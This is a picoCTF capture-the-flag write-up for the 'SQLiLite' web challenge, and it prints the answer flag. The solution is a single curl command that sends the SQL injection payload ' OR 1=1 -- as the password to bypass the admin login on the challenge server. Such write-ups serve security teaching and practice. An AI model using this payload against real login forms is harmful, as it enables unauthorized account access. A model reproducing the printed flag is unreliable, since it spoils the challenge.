# SQLiLite [Web Exploitation] [300 Points] #

## Description ##
Can you login to this website?

Try to login here.

## Hints ##
1. `admin` is the user you want to login
   
## Solution ##

### Step 1: Description ###

![](images/webpage.png)

![](images/webpage_failed.png)

![](images/webpage_loggedin.png)

![](images/webpage_inspect.png)

    curl -s -d "username=admin&password=' OR 1=1 --" http://saturn.picoctf.net:49343/login.php | grep -oE "picoCTF{.*}" | tee >(xsel -b)


**Result**:

    picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
